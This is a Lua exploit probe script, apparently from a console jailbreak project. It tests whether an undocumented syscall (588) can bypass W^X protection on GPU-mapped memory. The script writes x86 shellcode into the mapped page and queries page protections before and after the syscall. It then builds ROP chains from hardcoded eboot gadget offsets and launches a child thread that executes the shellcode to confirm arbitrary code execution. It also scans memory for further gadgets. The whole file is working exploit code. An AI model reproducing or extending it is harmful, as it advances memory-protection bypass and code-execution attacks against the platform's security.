-- CRASH_CLASS: MODERATE
-- PROBE 124a: sys 588 W^X bypass verification via fcall_with_rax
--
-- 54d proved sys 588 returns 0 with prot=RWX on GPU mmap pages.
-- But nobody verified if EXEC bit is actually set.
--
-- Strategy:
--   [A] GPU mmap + write shellcode + sys 588(addr, len, prot_struct)
--   [B] Verify protection via sys 547 before and after 588
--   [C] Execute shellcode via native.fcall_with_rax (in child thread for safety)
--   [D] If child survives with correct return → W^X is DEAD

print("=== PROBE 124a: SYS 588 W^X VERIFY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function full_addr(v)
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return uint64(string.format("0x%X%08X", h, l))
end
local function is_err(v)
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub = syscall.pipe.fn_addr
local SA = syscall.syscall_address
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sc588 = mk(588)
local sc547 = mk(547)
local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_tc = mk(430)

-- Query memory protection at addr via sys 547
local function query_prot(addr)
    local out = memory.alloc(0x100)
    for i = 0, 0x3F, 4 do wd(N(out) + i, 0) end
    local ok, rv = pcall(function() return sc547(addr, uint64(out), uint64(0x100)) end)
    if not ok then return "PFAIL", {} end
    local ret = N(rv)
    local vals = {}
    for i = 0, 0x3F, 4 do
        local v = rd(N(out) + i)
        if v ~= nil and v ~= 0 then
            if v < 0 then v = v + 0x100000000 end
            vals[i] = v
        end
    end
    return ret, vals
end

-- [A] Allocate GPU mmap page
print("[A] GPU mmap")
local gpu = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if is_err(gpu) then print("  GPU MMAP FAIL") return end
local GPU = full_addr(gpu)
print("  gpu=" .. fmt_q(gpu))

-- Write test shellcode at gpu+0x1000 (offset into page for alignment)
-- Shellcode: mov eax, 0xDEAD; ret
-- B8 AD DE 00 00 C3
local SC = GPU + uint64(0x1000)
wd(N(SC), 0x0000DEAD)       -- this puts AD DE 00 00 but we need B8 AD DE 00 00
-- Actually, let me be precise with the encoding:
-- mov eax, imm32: B8 + imm32 (little endian)
-- mov eax, 0x0000DEAD = B8 AD DE 00 00
-- ret = C3
-- So bytes: B8 AD DE 00 00 C3
-- As dwords (LE): dword[0] = 0x00DEADB8, dword[4] = 0x000000C3
wd(N(SC), 0x00DEADB8)       -- B8 AD DE 00
wd(N(SC) + 4, 0x000000C3)   -- 00 C3 00 00

-- Verify shellcode bytes are written correctly
local v0 = rd(N(SC))
local v4 = rd(N(SC) + 4)
if v0 ~= nil and v0 < 0 then v0 = v0 + 0x100000000 end
if v4 ~= nil and v4 < 0 then v4 = v4 + 0x100000000 end
print(string.format("  shellcode: %08X %08X", v0 or 0, v4 or 0))
print("  expected:  00DEADB8 000000C3")

-- Also write a simpler variant at SC+0x10: xor eax,eax; ret (31 C0 C3)
local SC2 = SC + uint64(0x10)
wd(N(SC2), 0x00C3C031)      -- 31 C0 C3 00
print("  sc2 (xor eax,eax;ret) at +" .. string.format("0x%X", 0x1010))

local c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED after write!") return end

-- [B] Query protection BEFORE sys 588
print("")
print("[B] protection BEFORE 588")
local ret_before, vals_before = query_prot(GPU)
print("  547 ret=" .. tostring(ret_before))
for k, v in pairs(vals_before) do
    print(string.format("    +%02X: %08X", k, v))
end

-- [C] Call sys 588 with RWX
-- From 54d: 588(gpu_addr, 0x4000, &struct) where struct has prot field
-- The handler does a 0x20-byte copyin from arg2 (third syscall arg)
-- Let me try the exact same layout as 54d
print("")
print("[C] sys 588 flip to RWX")

-- Build the 0x20-byte struct
-- 54d tested: struct[+0]=prot → ret=0
-- The CHANGELOG says: "requires a 0x20-byte copyin (0xabc676)"
-- Try prot value at multiple offsets to find the right one
local pstruct = memory.alloc(0x40)
for i = 0, 0x3F, 4 do wd(N(pstruct) + i, 0) end

-- Layout attempt 1: prot at +0, size at +8
wd(N(pstruct), 7)           -- prot = RWX = 7
wq(N(pstruct) + 8, uint64(0x4000))  -- size?
local ok588, rv588 = pcall(function()
    return sc588(GPU, uint64(0x4000), uint64(pstruct))
end)
print("  588(gpu, 0x4000, struct[0]=7) -> " .. (ok588 and tostring(N(rv588)) or "PFAIL"))

c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED after 588!") return end

-- Query protection AFTER
print("")
print("[D] protection AFTER 588")
local ret_after, vals_after = query_prot(GPU)
print("  547 ret=" .. tostring(ret_after))
for k, v in pairs(vals_after) do
    print(string.format("    +%02X: %08X", k, v))
end

-- Did protection change?
local changed = false
for k, v in pairs(vals_after) do
    if vals_before[k] ~= v then
        print(string.format("  CHANGED: +%02X: %08X -> %08X", k, vals_before[k] or 0, v))
        changed = true
    end
end
if not changed then print("  protection UNCHANGED") end

-- [E] Try execution via native.fcall_with_rax (RISKY — may kill)
-- First test: call the xor eax,eax;ret gadget (returns 0)
-- If page is not executable, this kills the process
print("")
print("[E] execution test via fcall_with_rax")
print("  target=" .. fmt_q(SC2) .. " (xor eax,eax;ret)")

-- We'll try in a child thread first for safety
-- Get eboot base for gadgets
local inf = memory.alloc(0x200)
wd(N(inf), 0x160)
pcall(function() mk(593)(uint64(0), inf) end)
local elo = rd(N(inf) + 0x108) or 0
local ehi = rd(N(inf) + 0x10C) or 0
if ehi < 0 then ehi = ehi + 0x100000000 end
if elo < 0 then elo = elo + 0x100000000 end

-- Gadgets from eboot
local PRDI = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local PRAX = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local WMOV = uint64(string.format("0x%X%08X", ehi, elo + 0x92C67))

-- Allocate shared memory for child results
local shared = sc_mmap(uint64(0), uint64(0x8000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if is_err(shared) then
    print("  shared mmap FAIL, trying direct fcall")
    -- Try direct fcall_with_rax (risky)
    local ok_exec, exec_rv = pcall(function()
        return native.fcall_with_rax(SC2, 0, 0)
    end)
    if ok_exec then
        local rv = N(exec_rv)
        print("  *** DIRECT EXEC RETURNED: " .. rv .. " ***")
        if rv == 0 then
            print("  *** W^X IS BYPASSED! shellcode executed on GPU mmap! ***")
        end
    else
        print("  direct exec FAILED (page likely not executable)")
    end
else
    local SH = full_addr(shared)
    -- [0]=status (0=pending, 0xDONE=completed, 0xDEAD=pre-exec marker)
    -- [8]=return value from shellcode call
    -- [16]=post-marker
    wq(SH, uint64(0))
    wq(SH + uint64(8), uint64(0xFFFF))
    wq(SH + uint64(16), uint64(0))

    -- Child ROP chain:
    -- 1. Set marker "about to call"
    -- pop rdi -> SH; pop rax -> 0xBEF0; mov [rdi],rax;ret
    -- 2. Call shellcode via: pop rdi -> 0 (arg); jmp SC2
    --    Actually we can't jmp to SC2 from ROP easily.
    --    Use: the child's initial RIP = SC2 (the shellcode itself!)
    --    After "xor eax,eax; ret", the child pops the next ROP address.
    --    ROP after ret: write rax to SH+8, then mark done.

    -- Build context
    local stk_base = SH + uint64(0x4000)
    local ctx = SH + uint64(0x1000)
    for i = 0, 0x1FF, 4 do wd(N(ctx) + i, 0) end

    -- Sony gates
    wq(ctx + uint64(0x108), uint64(0x480))
    wd(N(ctx) + 0x0D0, 0)
    wq(ctx + uint64(0x110), uint64(0x10000))
    wq(ctx + uint64(0x0C0), uint64(0x43))  -- CS
    wq(ctx + uint64(0x100), uint64(0x3B))  -- SS

    -- Child entry: RIP = shellcode (xor eax,eax; ret)
    -- After ret, child pops next address from stack into RIP
    wq(ctx + uint64(0x0E0), SC2)  -- RIP = shellcode
    wq(ctx + uint64(0x0F8), stk_base + uint64(0x3000))  -- RSP

    -- ROP chain on stack after shellcode ret:
    -- rax already = 0 from xor eax,eax
    local sp = N(stk_base) + 0x3000

    -- Step 1: write rax (shellcode result) to SH+8
    wq(sp, PRDI); sp = sp + 8
    wq(sp, SH + uint64(8)); sp = sp + 8
    wq(sp, WMOV); sp = sp + 8  -- mov [rdi], rax; ret

    -- Step 2: mark done
    wq(sp, PRDI); sp = sp + 8
    wq(sp, SH + uint64(16)); sp = sp + 8
    wq(sp, PRAX); sp = sp + 8
    wq(sp, uint64(0xD04E)); sp = sp + 8
    wq(sp, WMOV); sp = sp + 8  -- mov [rdi], rax; ret

    -- Step 3: nanosleep spin
    local ts_addr = N(SH) + 0x800
    wq(ts_addr, uint64(999))
    wq(ts_addr + 8, uint64(0))
    wq(sp, PRDI); sp = sp + 8
    wq(sp, uint64(ts_addr)); sp = sp + 8
    wq(sp, PRAX); sp = sp + 8
    wq(sp, uint64(240)); sp = sp + 8
    wq(sp, SA); sp = sp + 8  -- syscall;ret (nanosleep)

    -- Pre-mark
    wq(SH, uint64(0xBEF0))

    -- Create child
    local tb = memory.alloc(16)
    wq(tb, uint64(0))
    local ok_tc, rv_tc = pcall(function() return sc_tc(ctx, uint64(tb), uint64(0)) end)
    local child_tid = rd(N(tb))
    print("  child create=" .. tostring(ok_tc) .. " rv=" .. (ok_tc and tostring(N(rv_tc)) or "?"))
    print("  child tid=" .. tostring(child_tid))

    -- Wait 500ms
    local sl = memory.alloc(16)
    wq(sl, uint64(0))
    wq(N(sl) + 8, uint64(500000000))
    native.fcall_with_rax(stub, 240, N(sl), 0)

    -- Read results
    local status = rd(N(SH))
    local retval_lo = rd(N(SH) + 8)
    local retval_hi = rd(N(SH) + 12)
    local done_marker = rd(N(SH) + 16)

    if status ~= nil and status < 0 then status = status + 0x100000000 end
    if retval_lo ~= nil and retval_lo < 0 then retval_lo = retval_lo + 0x100000000 end
    if done_marker ~= nil and done_marker < 0 then done_marker = done_marker + 0x100000000 end

    print(string.format("  status=0x%X", status or 0))
    print(string.format("  retval=0x%X", retval_lo or 0))
    print(string.format("  done=0x%X", done_marker or 0))

    if done_marker == 0xD04E then
        print("  *** CHILD COMPLETED — shellcode EXECUTED on GPU page! ***")
        if retval_lo == 0 then
            print("  *** W^X IS BYPASSED! xor eax,eax;ret returned 0 ***")
            print("  *** THIS IS THE KEY PRIMITIVE — ARBITRARY CODE EXEC ***")
        else
            print("  child returned unexpected value: " .. tostring(retval_lo))
        end
    elseif status == 0xBEF0 then
        print("  child died during shellcode execution (page NOT executable)")
        print("  sys 588 returns 0 but hypervisor blocks EXEC bit")
    else
        print("  child status unknown (may have died before RIP set)")
    end

    -- Also try: redirect child to a KNOWN eboot gadget to verify child works
    -- (control experiment)
    print("")
    print("[F] control: child executes eboot gadget")
    for i = 0, 0x1FF, 4 do wd(N(ctx) + i, 0) end
    wq(ctx + uint64(0x108), uint64(0x480))
    wd(N(ctx) + 0x0D0, 0)
    wq(ctx + uint64(0x110), uint64(0x10000))
    wq(ctx + uint64(0x0C0), uint64(0x43))
    wq(ctx + uint64(0x100), uint64(0x3B))

    -- Use known eboot gadget: xor eax,eax;ret
    -- eboot+0x992 might be "pop rax;ret" - we need xor eax,eax;ret somewhere
    -- Let's scan for 31 C0 C3 in first 64KB of eboot
    local XOR_GADGET = nil
    for off = 0, 0x10000, 1 do
        local addr = uint64(string.format("0x%X%08X", ehi, elo + off))
        local ok_r, w = pcall(function() return N(memory.read_dword(addr)) end)
        if ok_r then
            -- Check for 31 C0 C3 (xor eax,eax; ret)
            local b0 = w % 256
            local b1 = math.floor(w / 256) % 256
            local b2 = math.floor(w / 65536) % 256
            if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
                XOR_GADGET = addr
                print(string.format("  xor_eax;ret @ eboot+0x%X", off))
                break
            end
        end
    end

    if XOR_GADGET then
        wq(SH + uint64(8), uint64(0xFFFF))
        wq(SH + uint64(16), uint64(0))

        wq(ctx + uint64(0x0E0), XOR_GADGET)
        wq(ctx + uint64(0x0F8), stk_base + uint64(0x2000))

        -- Same ROP chain but at different stack offset
        sp = N(stk_base) + 0x2000
        wq(sp, PRDI); sp = sp + 8
        wq(sp, SH + uint64(8)); sp = sp + 8
        wq(sp, WMOV); sp = sp + 8
        wq(sp, PRDI); sp = sp + 8
        wq(sp, SH + uint64(16)); sp = sp + 8
        wq(sp, PRAX); sp = sp + 8
        wq(sp, uint64(0xD04E)); sp = sp + 8
        wq(sp, WMOV); sp = sp + 8
        wq(sp, PRDI); sp = sp + 8
        wq(sp, uint64(ts_addr)); sp = sp + 8
        wq(sp, PRAX); sp = sp + 8
        wq(sp, uint64(240)); sp = sp + 8
        wq(sp, SA); sp = sp + 8

        wq(tb, uint64(0))
        local ok_tc2, rv_tc2 = pcall(function() return sc_tc(ctx, uint64(tb), uint64(0)) end)
        print("  control create=" .. tostring(ok_tc2) .. " rv=" .. (ok_tc2 and tostring(N(rv_tc2)) or "?"))

        native.fcall_with_rax(stub, 240, N(sl), 0)

        local ctrl_done = rd(N(SH) + 16)
        local ctrl_ret = rd(N(SH) + 8)
        if ctrl_done ~= nil and ctrl_done < 0 then ctrl_done = ctrl_done + 0x100000000 end
        if ctrl_ret ~= nil and ctrl_ret < 0 then ctrl_ret = ctrl_ret + 0x100000000 end
        print(string.format("  ctrl_done=0x%X ctrl_ret=0x%X", ctrl_done or 0, ctrl_ret or 0))
        if ctrl_done == 0xD04E then
            print("  control PASSED — child thread + eboot gadget works")
        else
            print("  control FAILED — child thread mechanism broken")
        end
    else
        print("  no xor eax;ret gadget found in eboot, skip control")
    end

    pcall(function() sc_munmap(SH, uint64(0x8000)) end)
end

-- Cleanup
pcall(function() sc_munmap(GPU, uint64(0x4000)) end)

c = N(native.fcall_with_rax(stub, 20))
print("")
print(string.format("canary=%s", c == pid and "OK" or "FAIL"))
print("=== 124a COMPLETE ===")
